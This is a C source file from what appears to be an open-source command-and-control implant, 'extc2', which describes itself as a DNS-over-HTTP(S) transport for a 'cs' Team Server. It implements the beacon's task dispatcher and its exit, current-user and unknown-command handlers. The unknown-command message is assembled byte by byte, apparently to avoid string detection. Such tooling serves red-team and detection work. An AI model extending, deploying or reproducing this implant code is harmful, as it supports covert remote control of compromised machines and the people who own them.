/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconTask
 *
 * Purpose:
 *
 * Executes the requested task, and returns
 * an unencryptes response to send to Team
 * Server.
 *
-*/
DEFINESEC(B) PBEACON_TASK_RES_HDR BeaconTask( PBEACON_INSTANCE Ins, PBEACON_TASK_REQ_BUF Req )
{
	PBEACON_TASK_RES_HDR Res = NULL;
	PBEACON_TASK_RES_HDR Ptr = NULL;
	ULONG                Cbs = 0;

	if ((Ptr = BufferCreate( Ins, sizeof( BEACON_TASK_RES_HDR ) )))
	{
		switch ( Req->CallId )
		{
			case BEACON_TASK_EXIT_REQUEST:
				Cbs = BeaconTaskExit( Ins, Req->Buffer, &Ptr );
				break;
			case BEACON_TASK_USER_REQUEST:
				Cbs = BeaconTaskUser( Ins, Req->Buffer, &Ptr );
				break;
			default:
				Cbs = BeaconTaskNone( Ins, Req->Buffer, &Ptr );
				break;
		};

		if ( Cbs != -1 )
		{
			if (( Res = Ins->api.LocalLock( Ptr )))
			{
				Res->Counter = Ins->ctx.LastTask++;
				Res->Length  = Ins->api.LocalSize( Ptr ) - 8;
				Res->CallId  = Cbs;
				Ins->api.LocalUnlock( Ptr );
			};
		};

		Ptr = Cbs != -1 ? Ptr : Ins->api.LocalFree( Ptr );
	};
	return Ptr;
};

/*-
 *
 * BeaconTaskExit 
 *
 * Purpose:
 *
 * Exits beacon.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskExit( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
{
	Ins->IsOnline = FALSE; 

	return BEACON_TASK_EXIT_CALLBACK;
};

/*-
 *
 * BeaconTaskNone
 *
 * Purpose:
 *
 * Returns an error string for 
 * unknown commands.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskNone( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
{
	UCHAR Err[ MAX_PATH ];

	Err[0]  = 'U';
	Err[1]  = 'n';
	Err[2]  = 'k';
	Err[3]  = 'n';
	Err[4]  = 'o';
	Err[5]  = 'w';
	Err[6]  = 'n';
	Err[7]  = ' ';
	Err[8]  = 'c';
	Err[9]  = 'o';
	Err[10] = 'm';
	Err[11] = 'm';
	Err[12] = 'a';
	Err[13] = 'n';
	Err[14] = 'd';
	Err[15] = 0x0;
	*Hdr = BufferAddRaw( Ins, *Hdr, Err, strlen( Err ) );

	return BEACON_TASK_STRING_CALLBACK;
};

/*
 *
 * BeaconTaskUser
 *
 * Purpose:
 *
 * Returns the username of the current
 * token.
 *
-*/
DEFINESEC(B) ULONG BeaconTaskUser( PBEACON_INSTANCE Ins, PVOID Buf, PBEACON_TASK_RES_HDR * Hdr )
{
	ULONG Call = -1;
	PVOID User = NULL;

	if ((User = BeaconUsername( Ins )))
	{
		*Hdr = BufferAddRaw( Ins, *Hdr, User, strlen( User ) );
		Call = BEACON_TASK_USER_CALLBACK; 
		Ins->api.LocalFree( User );
	};
	return Call;
};
